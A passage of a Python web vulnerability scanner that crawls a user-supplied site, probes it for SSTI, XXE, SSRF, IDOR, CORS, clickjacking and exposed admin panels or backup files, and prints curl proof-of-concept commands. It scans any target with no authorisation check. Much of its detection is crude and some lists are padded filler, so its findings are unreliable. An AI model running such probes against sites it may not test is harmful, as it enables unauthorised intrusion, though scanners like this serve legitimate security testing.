                        if payload in content:
                            return {
                                "type": "File Upload",
                                "url": url,
                                "payload": payload,
                                "poc": f"curl -X POST '{url}' -F 'file=@{payload}'",
                                "exploit": f"python3 file_upload.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_insecure_deserialization(self, url: str) -> Optional[Dict]:
        """Check for insecure deserialization vulnerabilities"""
        for payload in PAYLOADS["insecure_deserialization"]:
            try:
                async with self.session.post(url, json=payload, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "System." in content or "ObjectDataProvider" in content:
                            return {
                                "type": "Insecure Deserialization",
                                "url": url,
                                "payload": payload,
                                "poc": f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{payload}'",
                                "exploit": f"python3 deserialization.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_ssti(self, url: str) -> Optional[Dict]:
        """Check for Server-Side Template Injection vulnerabilities"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["ssti"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            if "49" in content:  # 7*7=49
                                return {
                                    "type": "Server-Side Template Injection (SSTI)",
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "poc": f"curl '{test_url}'",
                                    "exploit": f"python3 ssti_exploit.py '{url}'"
                                }
                except Exception:
                    continue
        return None

    async def check_idor(self, url: str) -> Optional[Dict]:
        """Check for Insecure Direct Object Reference vulnerabilities"""
        for payload in PAYLOADS["idor"]:
            test_url = urljoin(url, payload)
            try:
                async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
                        if any(indicator in content.lower() for indicator in ["user", "profile", "account"]):
                            return {
                                "type": "Insecure Direct Object Reference (IDOR)",
                                "url": test_url,
                                "payload": payload,
                                "poc": f"curl '{test_url}'",
                                "exploit": f"python3 idor_exploit.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_jwt_weak(self, url: str) -> Optional[Dict]:
        """Check for weak JWT implementation"""
        try:
            async with self.session.get(url, timeout=5, headers=HEADERS) as response:
                if response.status == 200:
                    cookies = response.cookies
                    for cookie in cookies:
                        if "jwt" in cookie.key.lower() or "token" in cookie.key.lower():
                            token = cookie.value
                            if "none" in token.lower() or "alg" not in token:
                                return {
                                    "type": "Weak JWT Implementation",
                                    "url": url,
                                    "poc": f"curl '{url}' -H 'Cookie: {cookie.key}={token}'",
                                    "exploit": f"python3 jwt_exploit.py '{url}'"
                                }
        except Exception:
            pass
        return None

    async def check_cors_misconfig(self, url: str) -> Optional[Dict]:
        """Check for CORS misconfiguration"""
        try:
            headers = HEADERS.copy()
            headers["Origin"] = "https://evil.com"
            async with self.session.get(url, timeout=5, headers=headers) as response:
                if response.status == 200:
                    acao = response.headers.get("Access-Control-Allow-Origin", "")
                    acac = response.headers.get("Access-Control-Allow-Credentials", "")
                    if acao == "*" or (acao == "https://evil.com" and acac == "true"):
                        return {
                            "type": "CORS Misconfiguration",
                            "url": url,
                            "poc": f"curl '{url}' -H 'Origin: https://evil.com'",
                            "exploit": f"python3 cors_exploit.py '{url}'"
                        }
        except Exception:
            pass
        return None

    async def check_clickjacking(self, url: str) -> Optional[Dict]:
        """Check for clickjacking vulnerability with enhanced detection"""
        try:
            async with self.session.get(url, timeout=5, headers=HEADERS) as response:
                if response.status == 200:
                    headers = response.headers
                    # Enhanced clickjacking detection
                    xfo = headers.get("X-Frame-Options", "").lower()
                    csp = headers.get("Content-Security-Policy", "").lower()
                    
                    # Check for multiple indicators
                    if (not xfo or 
                        (xfo != "deny" and xfo != "sameorigin") or
                        ("frame-ancestors" not in csp and 
                         "frame-ancestors 'none'" not in csp and 
                         "frame-ancestors 'self'" not in csp)):
                        
                        # Additional verification
                        # 1. Check if the page contains sensitive actions
                        content = await response.text()
                        sensitive_actions = [
                            "login", "logout", "delete", "update", "modify",
                            "change", "transfer", "purchase", "buy", "sell",
                            "withdraw", "deposit", "transfer", "send", "receive",
                            "confirm", "approve", "reject", "accept", "decline",
                            "submit", "save", "edit", "create", "remove",
                            "add", "remove", "block", "unblock", "ban",
                            "unban", "mute", "unmute", "kick", "invite",
                            "join", "leave", "follow", "unfollow", "like",
                            "unlike", "share", "report", "flag", "block",
                            "unblock", "mute", "unmute", "kick", "invite",
                            "join", "leave", "follow", "unfollow", "like",
                            "unlike", "share", "report", "flag"
                        ]
                        
                        # 2. Check for sensitive actions in the page
                        if any(action in content.lower() for action in sensitive_actions):
                            # 3. Check for forms and buttons
                            if ("<form" in content or 
                                "<button" in content or 
                                "<input type=\"submit\"" in content or
                                "<input type=\"button\"" in content):
                                return {
                                    "type": "Clickjacking",
                                    "url": url,
                                    "poc": f"<iframe src='{url}' style='opacity:0;position:fixed;top:0;left:0;height:100%;width:100%;z-index:1000;'></iframe>",
                                    "exploit": f"python3 clickjacking.py '{url}'"
                                }
        except Exception:
            pass
        return None

    async def check_host_header_injection(self, url: str) -> Optional[Dict]:
        """Check for host header injection"""
        for payload in PAYLOADS["host_header_injection"]:
            try:
                headers = HEADERS.copy()
                headers["Host"] = payload
                async with self.session.get(url, timeout=5, headers=headers) as response:
                    if response.status == 200:
                        content = await response.text()
                        if payload in content:
                            return {
                                "type": "Host Header Injection",
                                "url": url,
                                "payload": payload,
                                "poc": f"curl '{url}' -H 'Host: {payload}'",
                                "exploit": f"python3 host_injection.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_http_parameter_pollution(self, url: str) -> Optional[Dict]:
        """Check for HTTP Parameter Pollution"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            test_url = url.replace(f"{param}={values[0]}", f"{param}=value1&{param}=value2")
            try:
                async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "value1" in content and "value2" in content:
                            return {
                                "type": "HTTP Parameter Pollution",
                                "url": url,
                                "parameter": param,
                                "poc": f"curl '{test_url}'",
                                "exploit": f"python3 hpp_exploit.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_xml_external_entity(self, url: str) -> Optional[Dict]:
        """Check for XML External Entity vulnerabilities"""
        for payload in PAYLOADS["xml_external_entity"]:
            try:
                async with self.session.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=5) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "root:" in content or "<?xml" in content:
                            return {
                                "type": "XML External Entity (XXE)",
                                "url": url,
                                "payload": payload,
                                "poc": f"curl -X POST '{url}' -H 'Content-Type: application/xml' -d '{payload}'",
                                "exploit": f"python3 xxe_exploit.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_server_side_request_forgery(self, url: str) -> Optional[Dict]:
        """Check for Server-Side Request Forgery"""
        for payload in PAYLOADS["server_side_request_forgery"]:
            try:
                async with self.session.get(url, params={"url": payload}, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
                        if any(indicator in content.lower() for indicator in ["localhost", "127.0.0.1", "internal"]):
                            return {
                                "type": "Server-Side Request Forgery (SSRF)",
                                "url": url,
                                "payload": payload,
                                "poc": f"curl '{url}?url={payload}'",
                                "exploit": f"python3 ssrf_exploit.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_insecure_cookies(self, url: str) -> Optional[Dict]:
        """Check for insecure cookies"""
        try:
            async with self.session.get(url, timeout=5, headers=HEADERS) as response:
                if response.status == 200:
                    cookies = response.cookies
                    for cookie in cookies:
                        if not cookie.get("httponly", False) or not cookie.get("secure", False):
                            return {
                                "type": "Insecure Cookies",
                                "url": url,
                                "cookie": cookie.key,
                                "poc": f"curl '{url}' -v",
                                "exploit": f"python3 cookie_exploit.py '{url}'"
                            }
        except Exception:
            pass
        return None

    async def check_insecure_headers(self, url: str) -> Optional[Dict]:
        """Check for insecure security headers with enhanced detection"""
        try:
            async with self.session.get(url, timeout=5, headers=HEADERS) as response:
                if response.status == 200:
                    headers = response.headers
                    insecure_headers = []
                    
                    # Enhanced header checks
                    # 1. X-XSS-Protection
                    xss_protection = headers.get("X-XSS-Protection", "")
                    if not xss_protection or xss_protection == "0":
                        insecure_headers.append("X-XSS-Protection")
                    
                    # 2. X-Content-Type-Options
                    content_type_options = headers.get("X-Content-Type-Options", "").lower()
                    if not content_type_options or "nosniff" not in content_type_options:
                        insecure_headers.append("X-Content-Type-Options")
                    
                    # 3. X-Frame-Options
                    frame_options = headers.get("X-Frame-Options", "").lower()
                    if not frame_options or "deny" not in frame_options:
                        insecure_headers.append("X-Frame-Options")
                    
                    # 4. Content-Security-Policy
                    csp = headers.get("Content-Security-Policy", "")
                    if not csp:
                        insecure_headers.append("Content-Security-Policy")
                    
                    # 5. Strict-Transport-Security
                    hsts = headers.get("Strict-Transport-Security", "")
                    if not hsts:
                        insecure_headers.append("Strict-Transport-Security")
                    
                    # 6. Referrer-Policy
                    referrer_policy = headers.get("Referrer-Policy", "")
                    if not referrer_policy:
                        insecure_headers.append("Referrer-Policy")
                    
                    # 7. Permissions-Policy
                    permissions_policy = headers.get("Permissions-Policy", "")
                    if not permissions_policy:
                        insecure_headers.append("Permissions-Policy")
                    
                    # 8. Cross-Origin-Embedder-Policy
                    coep = headers.get("Cross-Origin-Embedder-Policy", "")
                    if not coep:
                        insecure_headers.append("Cross-Origin-Embedder-Policy")
                    
                    # 9. Cross-Origin-Opener-Policy
                    coop = headers.get("Cross-Origin-Opener-Policy", "")
                    if not coop:
                        insecure_headers.append("Cross-Origin-Opener-Policy")
                    
                    # 10. Cross-Origin-Resource-Policy
                    corp = headers.get("Cross-Origin-Resource-Policy", "")
                    if not corp:
                        insecure_headers.append("Cross-Origin-Resource-Policy")
                    
                    if insecure_headers:
                        return {
                            "type": "Insecure Security Headers",
                            "url": url,
                            "headers": insecure_headers,
                            "poc": f"curl '{url}' -I",
                            "exploit": f"python3 headers_exploit.py '{url}'"
                        }
        except Exception:
            pass
        return None

    async def check_insecure_authentication(self, url: str) -> Optional[Dict]:
        """Check for insecure authentication with enhanced detection"""
        for payload in PAYLOADS["insecure_authentication"]:
            try:
                headers = HEADERS.copy()
                headers["Authorization"] = payload
                async with self.session.get(url, timeout=5, headers=headers) as response:
                    if response.status == 200:
                        # Enhanced authentication checks
                        # 1. Check for basic authentication
                        if "Basic" in payload:
                            # 2. Check if the response contains sensitive information
                            content = await response.text()
                            sensitive_info = [
                                "admin", "administrator", "root", "superuser",
                                "password", "secret", "token", "key", "api",
                                "database", "config", "settings", "credentials",
                                "login", "logout", "session", "cookie", "auth",
                                "authentication", "authorization", "access",
                                "control", "management", "dashboard", "panel",
                                "console", "terminal", "shell", "command",
                                "execute", "run", "system", "server", "host",
                                "port", "ip", "address", "domain", "url",
                                "path", "file", "directory", "folder", "backup",
                                "restore", "import", "export", "download",
                                "upload", "delete", "remove", "create", "edit",
                                "modify", "update", "change", "set", "get",
                                "put", "post", "delete", "head", "options",
                                "trace", "connect", "patch", "copy", "move",
                                "lock", "unlock", "purge", "link", "unlink",
                                "subscribe", "unsubscribe", "publish", "unpublish",
                                "approve", "reject", "accept", "decline", "block",
                                "unblock", "ban", "unban", "mute", "unmute",
                                "kick", "invite", "join", "leave", "follow",
                                "unfollow", "like", "unlike", "share", "report",
                                "flag", "block", "unblock", "mute", "unmute",
                                "kick", "invite", "join", "leave", "follow",
                                "unfollow", "like", "unlike", "share", "report",
                                "flag"
                            ]
                            
                            # 3. Check for sensitive information in the response
                            if any(info in content.lower() for info in sensitive_info):
                                # 4. Check for authentication-related headers
                                auth_headers = response.headers
                                if ("WWW-Authenticate" in auth_headers or
                                    "Authorization" in auth_headers or
                                    "X-Auth-Token" in auth_headers or
                                    "X-Api-Key" in auth_headers or
                                    "X-Access-Token" in auth_headers or
                                    "X-Refresh-Token" in auth_headers or
                                    "X-CSRF-Token" in auth_headers or
                                    "X-XSRF-Token" in auth_headers):
                                    return {
                                        "type": "Insecure Authentication",
                                        "url": url,
                                        "payload": payload,
                                        "poc": f"curl '{url}' -H 'Authorization: {payload}'",
                                        "exploit": f"python3 auth_exploit.py '{url}'"
                                    }
            except Exception:
                continue
        return None

    async def check_insecure_direct_object_references(self, url: str) -> Optional[Dict]:
        """Check for Insecure Direct Object References"""
        for payload in PAYLOADS["insecure_direct_object_references"]:
            test_url = urljoin(url, payload)
            try:
                async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
                        if any(indicator in content.lower() for indicator in ["user", "profile", "account"]):
                            return {
                                "type": "Insecure Direct Object References (IDOR)",
                                "url": test_url,
                                "payload": payload,
                                "poc": f"curl '{test_url}'",
                                "exploit": f"python3 idor_exploit.py '{url}'"
                            }
            except Exception:
                continue
        return None

    async def check_admin_panels(self, base_url: str) -> Optional[Dict]:
        """Check for exposed admin panels with enhanced detection"""
        admin_indicators = [
            "login", "admin", "password", "username", "administrator", "dashboard",
            "control panel", "management", "backend", "cpanel", "wp-admin", "wp-login",
            "administrator/index.php", "admin/login.php", "admin/index.php",
            "admin/account.php", "admin_area", "admin-area", "admin_area/admin.php",
            "admin_area/login.php", "siteadmin", "siteadmin/login.php", "siteadmin/index.php",
            "admin/controlpanel.php", "admincp", "admincp/index.php", "admincp/login.php",
            "admin2", "admin2/index.php", "admin2/login.php", "adm", "adm/index.php",
            "adm/login.php", "administratorlogin", "administratorlogin/index.php",
            "administratorlogin/login.php", "phpmyadmin", "phpMyAdmin", "pma",
            "myadmin", "mysqladmin", "dbadmin", "webadmin", "serveradmin", "sysadmin",
            "webmaster", "root", "superuser", "superadmin", "supervisor", "manager",
            "director", "operator", "operator/index.php", "operator/login.php",
            "panel", "panel/index.php", "panel/login.php", "adminpanel", "adminpanel/index.php",
            "adminpanel/login.php", "admin1", "admin1/index.php", "admin1/login.php",
            "admin3", "admin3/index.php", "admin3/login.php", "admin4", "admin4/index.php",
            "admin4/login.php", "admin5", "admin5/index.php", "admin5/login.php",
            "usuarios", "usuarios/login.php", "usuarios/index.php", "usuario",
            "usuario/login.php", "usuario/index.php", "administrator/account.php",
            "administrator/login.php", "administrator/index.php", "administrator/admin.php",
            "administrator/access.php", "administrator/controlpanel.php", "administrator/cp.php",
            "administrator/cpanel.php", "administrator/dashboard.php", "administrator/home.php",
            "administrator/main.php", "administrator/manage.php", "administrator/panel.php",
            "administrator/site.php", "administrator/sysadmin.php", "administrator/user.php",
            "administrator/webadmin.php", "administrator/webmaster.php", "administrator/webshell.php",
            "administrator/webshells.php", "administrator/webshells/", "administrator/webshells/index.php",
            "administrator/webshells/login.php", "administrator/webshells/admin.php",
            "administrator/webshells/cpanel.php", "administrator/webshells/cp.php",
            "administrator/webshells/dashboard.php", "administrator/webshells/home.php",
            "administrator/webshells/main.php", "administrator/webshells/manage.php",
            "administrator/webshells/panel.php", "administrator/webshells/site.php",
            "administrator/webshells/sysadmin.php", "administrator/webshells/user.php",
            "administrator/webshells/webadmin.php", "administrator/webshells/webmaster.php"
        ]

        for panel in PAYLOADS["admin_panels"]:
            test_url = urljoin(base_url, panel)
            try:
                async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Enhanced admin panel detection
                        if any(keyword.lower() in content.lower() for keyword in admin_indicators):
                            # Additional verification
                            original_response = await self.session.get(base_url, timeout=5, headers=HEADERS)
                            original_content = await original_response.text()
                            if content != original_content:  # Content changed due to admin panel
                                return {
                                    "type": "Exposed Admin Panel",
                                    "url": test_url,
                                    "poc": f"curl '{test_url}'",
                                    "exploit": f"python3 admin_panel_brute.py '{test_url}'"
                                }
            except Exception:
                continue
        return None

    async def check_backup_files(self, base_url: str) -> Optional[Dict]:
        """Check for exposed backup files with enhanced detection"""
        backup_indicators = [
            ".bak", ".old", ".backup", ".swp", ".swo", ".save", ".bak~", ".bak1", ".bak2",
            ".back", ".backup1", ".backup2", ".backup3", ".backup4", ".backup5", ".backup6",
            ".backup7", ".backup8", ".backup9", ".backup10", ".backup11", ".backup12",
            ".backup13", ".backup14", ".backup15", ".backup16", ".backup17", ".backup18",
            ".backup19", ".backup20", ".backup21", ".backup22", ".backup23", ".backup24",
            ".backup25", ".backup26", ".backup27", ".backup28", ".backup29", ".backup30",
            ".backup31", ".backup32", ".backup33", ".backup34", ".backup35", ".backup36",
            ".backup37", ".backup38", ".backup39", ".backup40", ".backup41", ".backup42",
            ".backup43", ".backup44", ".backup45", ".backup46", ".backup47", ".backup48",
            ".backup49", ".backup50", ".backup51", ".backup52", ".backup53", ".backup54",
            ".backup55", ".backup56", ".backup57", ".backup58", ".backup59", ".backup60",
            ".backup61", ".backup62", ".backup63", ".backup64", ".backup65", ".backup66",
            ".backup67", ".backup68", ".backup69", ".backup70", ".backup71", ".backup72",
            ".backup73", ".backup74", ".backup75", ".backup76", ".backup77", ".backup78",
            ".backup79", ".backup80", ".backup81", ".backup82", ".backup83", ".backup84",
            ".backup85", ".backup86", ".backup87", ".backup88", ".backup89", ".backup90",
            ".backup91", ".backup92", ".backup93", ".backup94", ".backup95", ".backup96",
            ".backup97", ".backup98", ".backup99", ".backup100", ".backup101", ".backup102",
            ".backup103", ".backup104", ".backup105", ".backup106", ".backup107", ".backup108",
            ".backup109", ".backup110", ".backup111", ".backup112", ".backup113", ".backup114",
            ".backup115", ".backup116", ".backup117", ".backup118", ".backup119", ".backup120",
            ".backup121", ".backup122", ".backup123", ".backup124", ".backup125", ".backup126",
            ".backup127", ".backup128", ".backup129", ".backup130", ".backup131", ".backup132",
            ".backup133", ".backup134", ".backup135", ".backup136", ".backup137", ".backup138",
            ".backup139", ".backup140", ".backup141", ".backup142", ".backup143", ".backup144",
            ".backup145", ".backup146", ".backup147", ".backup148", ".backup149", ".backup150",
            ".backup151", ".backup152", ".backup153", ".backup154", ".backup155", ".backup156",
            ".backup157", ".backup158", ".backup159", ".backup160", ".backup161", ".backup162",
            ".backup163", ".backup164", ".backup165", ".backup166", ".backup167", ".backup168",
            ".backup169", ".backup170", ".backup171", ".backup172", ".backup173", ".backup174",
            ".backup175", ".backup176", ".backup177", ".backup178", ".backup179", ".backup180",
            ".backup181", ".backup182", ".backup183", ".backup184", ".backup185", ".backup186",
            ".backup187", ".backup188", ".backup189", ".backup190", ".backup191", ".backup192",
            ".backup193", ".backup194", ".backup195", ".backup196", ".backup197", ".backup198",
            ".backup199", ".backup200", ".backup201", ".backup202", ".backup203", ".backup204",
            ".backup205", ".backup206", ".backup207", ".backup208", ".backup209", ".backup210",
            ".backup211", ".backup212", ".backup213", ".backup214", ".backup215", ".backup216",
            ".backup217", ".backup218", ".backup219", ".backup220", ".backup221", ".backup222",
            ".backup223", ".backup224", ".backup225", ".backup226", ".backup227", ".backup228",
            ".backup229", ".backup230", ".backup231", ".backup232", ".backup233", ".backup234",
            ".backup235", ".backup236", ".backup237", ".backup238", ".backup239", ".backup240",
            ".backup241", ".backup242", ".backup243", ".backup244", ".backup245", ".backup246",
            ".backup247", ".backup248", ".backup249", ".backup250", ".backup251", ".backup252",
            ".backup253", ".backup254", ".backup255", ".backup256", ".backup257", ".backup258",
            ".backup259", ".backup260", ".backup261", ".backup262", ".backup263", ".backup264",
            ".backup265", ".backup266", ".backup267", ".backup268", ".backup269", ".backup270",
            ".backup271", ".backup272", ".backup273", ".backup274", ".backup275", ".backup276",
            ".backup277", ".backup278", ".backup279", ".backup280", ".backup281", ".backup282",
            ".backup283", ".backup284", ".backup285", ".backup286", ".backup287", ".backup288",
            ".backup289", ".backup290", ".backup291", ".backup292", ".backup293", ".backup294",
            ".backup295", ".backup296", ".backup297", ".backup298", ".backup299", ".backup300"
        ]

        parsed = urlparse(base_url)
        path = parsed.path
        filename = path.split('/')[-1]
        
        for ext in backup_indicators:
            test_url = urljoin(base_url, f"{filename}{ext}")
            try:
                async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Enhanced backup file detection
                        if any(keyword.lower() in content.lower() for keyword in ["database", "config", "settings", "password", "username", "host", "port", "dbname", "dbuser", "dbpass", "dbhost", "dbport", "dbname", "dbuser", "dbpass", "dbhost", "dbport"]):
                            return {
                                "type": "Exposed Backup File",
                                "url": test_url,
                                "poc": f"curl '{test_url}'",
                                "exploit": f"wget '{test_url}'"
                            }
            except Exception:
                continue
        return None

    async def scan_url(self, url: str) -> List[Dict]:
        """Scan a URL for all vulnerabilities"""
        results = []
        
        # Check SQL Injection
        if "?" in url:
            sql_result = await self.check_sql_injection(url)
            if sql_result:
                results.append(sql_result)
        
        # Check LFI
        if "?" in url:
            lfi_result = await self.check_lfi(url)
            if lfi_result:
                results.append(lfi_result)
        
        # Check Admin Panels
        admin_result = await self.check_admin_panels(url)
        if admin_result:
            results.append(admin_result)
        
        # Check Backup Files
        backup_result = await self.check_backup_files(url)
        if backup_result:
            results.append(backup_result)
        
        # New vulnerability checks
        command_injection_result = await self.check_command_injection(url)
        if command_injection_result:
            results.append(command_injection_result)

        xxe_result = await self.check_xxe(url)
        if xxe_result:
            results.append(xxe_result)

        ssrf_result = await self.check_ssrf(url)
        if ssrf_result:
            results.append(ssrf_result)

        path_traversal_result = await self.check_path_traversal(url)
        if path_traversal_result:
            results.append(path_traversal_result)

        open_redirect_result = await self.check_open_redirect(url)
        if open_redirect_result:
            results.append(open_redirect_result)

        csrf_result = await self.check_csrf(url)
        if csrf_result:
            results.append(csrf_result)

        file_upload_result = await self.check_file_upload(url)
        if file_upload_result:
            results.append(file_upload_result)

        insecure_deserialization_result = await self.check_insecure_deserialization(url)
        if insecure_deserialization_result:
            results.append(insecure_deserialization_result)

        ssti_result = await self.check_ssti(url)
        if ssti_result:
            results.append(ssti_result)

        idor_result = await self.check_idor(url)
        if idor_result:
            results.append(idor_result)

        jwt_weak_result = await self.check_jwt_weak(url)
        if jwt_weak_result:
            results.append(jwt_weak_result)

        cors_misconfig_result = await self.check_cors_misconfig(url)
        if cors_misconfig_result:
            results.append(cors_misconfig_result)

        clickjacking_result = await self.check_clickjacking(url)
        if clickjacking_result:
            results.append(clickjacking_result)

        host_header_injection_result = await self.check_host_header_injection(url)
        if host_header_injection_result:
            results.append(host_header_injection_result)

        http_parameter_pollution_result = await self.check_http_parameter_pollution(url)
        if http_parameter_pollution_result:
            results.append(http_parameter_pollution_result)

        xml_external_entity_result = await self.check_xml_external_entity(url)
        if xml_external_entity_result:
            results.append(xml_external_entity_result)

        server_side_request_forgery_result = await self.check_server_side_request_forgery(url)
        if server_side_request_forgery_result:
            results.append(server_side_request_forgery_result)

        insecure_cookies_result = await self.check_insecure_cookies(url)
        if insecure_cookies_result:
            results.append(insecure_cookies_result)

        insecure_headers_result = await self.check_insecure_headers(url)
        if insecure_headers_result:
            results.append(insecure_headers_result)

        insecure_authentication_result = await self.check_insecure_authentication(url)
        if insecure_authentication_result:
            results.append(insecure_authentication_result)

        insecure_direct_object_references_result = await self.check_insecure_direct_object_references(url)
        if insecure_direct_object_references_result:
            results.append(insecure_direct_object_references_result)
        
        return results

async def fetch(session, url):
    try:
        async with session.get(url, timeout=5, headers=HEADERS) as response:
            text = await response.text()
            return response, text
    except Exception:
        return None, None

async def worker(queue, session, domain, progress_task, progress):
    while not queue.empty():
        url = await queue.get()
        if url in visited:
            queue.task_done()
            continue

        visited.add(url)

        response, html = await fetch(session, url)
        if html is None:
            queue.task_done()
            continue

        soup = BeautifulSoup(html, "html.parser")

        # روابط
        for link_tag in soup.find_all("a"):
            href = link_tag.get("href")
            if href:
                href = urljoin(url, href)
                parsed = urlparse(href)
                if parsed.netloc == domain:
                    clean_url = parsed.scheme + "://" + parsed.netloc + parsed.path

                    if clean_url.endswith("/") and clean_url not in extracted_folders:
                        extracted_folders.add(clean_url)
                        console.print(f"[blue][+] Found Folder:[/] {clean_url}")

                    if "?" in href and href not in extracted_links:
                        extracted_links.add(href)
                        console.print(f"[green][+] Found Link with Parameters:[/] {href}")

                    if clean_url not in visited and clean_url not in extracted_links:
                        await queue.put(clean_url)

        # نماذج
        for form in soup.find_all("form"):
            action = form.get("action")
            full_action_url = urljoin(url, action) if action else url
            if full_action_url not in extracted_forms:
                extracted_forms.add(full_action_url)
                console.print(f"[magenta][+] Found Form at:[/] {full_action_url}")

        await asyncio.sleep(0.1)
        progress.advance(progress_task)
        queue.task_done()

async def get_server_info(url):
    parsed = urlparse(url)
    hostname = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    server_info = {
        "Server": "Not available",
        "X-Powered-By": "Not available",
        "Content-Type": "Not available",
        "URL": f"{parsed.scheme}://{hostname}",
        "Port": str(port)
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10, headers=HEADERS) as response:
                if response and response.headers:
                    headers = response.headers
                    server_info["Server"] = headers.get("Server", "Not available")
                    server_info["X-Powered-By"] = headers.get("X-Powered-By", "Not available")
                    server_info["Content-Type"] = headers.get("Content-Type", "Not available")
    except Exception as e:
        console.print(f"[red]Error fetching server info:[/] {e}")

    return server_info

async def get_tech_info(url):
    try:
        tech = builtwith.parse(url)
        tech_info = ""
        for category, tech_list in tech.items():
            tech_info += f"[bold yellow]Category:[/] {category}\n"
            for tech_name in tech_list:
                tech_info += f" - {tech_name}\n"
        return tech_info or "No technologies detected."
    except Exception as e:
        if "aiodns" in str(e):
            return "[yellow]Note:[/] Technology detection is limited on Windows due to aiodns limitations.\nPlease consider running this on Linux for full technology detection."
        return f"[red]Error in builtwith:[/] {e}"

async def get_whois_info(url):
    try:
        parsed = urlparse(url)
        domain = parsed.hostname
        w = whois.whois(domain)
        
        whois_info = []
        if w.domain_name:
            whois_info.append(f"[yellow]Domain:[/] {w.domain_name}")
        if w.registrar:
            whois_info.append(f"[yellow]Registrar:[/] {w.registrar}")
        if w.creation_date:
            whois_info.append(f"[yellow]Creation Date:[/] {w.creation_date}")
        if w.expiration_date:
            whois_info.append(f"[yellow]Expiration Date:[/] {w.expiration_date}")
        if w.name_servers:
            whois_info.append(f"[yellow]Name Servers:[/] {', '.join(w.name_servers)}")
        if w.emails:
            whois_info.append(f"[yellow]Emails:[/] {', '.join(w.emails)}")
        if w.org:
            whois_info.append(f"[yellow]Organization:[/] {w.org}")
        if w.country:
            whois_info.append(f"[yellow]Country:[/] {w.country}")
            
        return "\n".join(whois_info) if whois_info else "No WHOIS information available"
    except Exception as e:
        return f"[red]Error fetching WHOIS information:[/] {e}"

async def main():
    target = input("Enter Target URL (e.g., https://example.com): ").strip()
    parsed_url = urlparse(target)
    domain = parsed_url.netloc

    domain_info = await get_server_info(target)
    tech_info = await get_tech_info(target)
    whois_info = await get_whois_info(target)

    combined_info = (
        f"[bold cyan]Domain Information:[/]\n"
        f"[yellow]Server:[/] {domain_info['Server']}\n"
        f"[yellow]X-Powered-By:[/] {domain_info['X-Powered-By']}\n"
        f"[yellow]Content-Type:[/] {domain_info['Content-Type']}\n"
        f"[yellow]URL:[/] {domain_info['URL']}\n"
        f"[yellow]Port:[/] {domain_info['Port']}\n\n"
        f"[bold cyan]Technologies Used:[/]\n{tech_info}\n\n"
        f"[bold cyan]WHOIS Information:[/]\n{whois_info}"
    )

    console.print(Panel(combined_info, title="[bold green]Server & Tech Info", expand=False))

    queue = asyncio.Queue()
    await queue.put(target)

    async with aiohttp.ClientSession() as session:
        scanner = VulnerabilityScanner(session)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            console=console,
            transient=True
        ) as progress:

            crawl_task = progress.add_task("[cyan]Crawling...", total=100)
            scan_task = progress.add_task("[red]Scanning for vulnerabilities...", total=100)

            tasks = []
            for _ in range(20):
                task = asyncio.create_task(worker(queue, session, domain, crawl_task, progress))
                tasks.append(task)

            while not queue.empty():
                await asyncio.sleep(0.1)
                progress.update(crawl_task, completed=(len(visited) % 100))

            await queue.join()
            for task in tasks:
                task.cancel()

            # Start vulnerability scanning
            all_urls = list(visited.union(extracted_links))
            for i, url in enumerate(all_urls):
                if url not in vulnerabilities_found:
                    results = await scanner.scan_url(url)
                    for vuln in results:
                        if vuln["type"] not in vulnerabilities_found:
                            vulnerabilities_found.add(vuln["type"])
                            console.print(Panel(
                                f"[bold red]Vulnerability Found![/]\n"
                                f"Type: {vuln['type']}\n"
                                f"URL: {vuln['url']}\n"
                                f"POC: {vuln['poc']}\n"
                                f"Exploit: {vuln['exploit']}",
                                title="[bold red]Vulnerability Report"
                            ))
                progress.update(scan_task, completed=(i / len(all_urls) * 100))

    # Show final summary
    console.print(Panel.fit(
        f"[bold green]Summary:[/]\n"
        f"Visited Pages: {len(visited)}\n"
        f"Links with Parameters: {len(extracted_links)}\n"
        f"Forms Found: {len(extracted_forms)}\n"
        f"Folders Found: {len(extracted_folders)}\n"
        f"Vulnerabilities Found: {len(vulnerabilities_found)}",
        title="[bold blue]Scan Complete"
    ))

if __name__ == "__main__":
    asyncio.run(main())
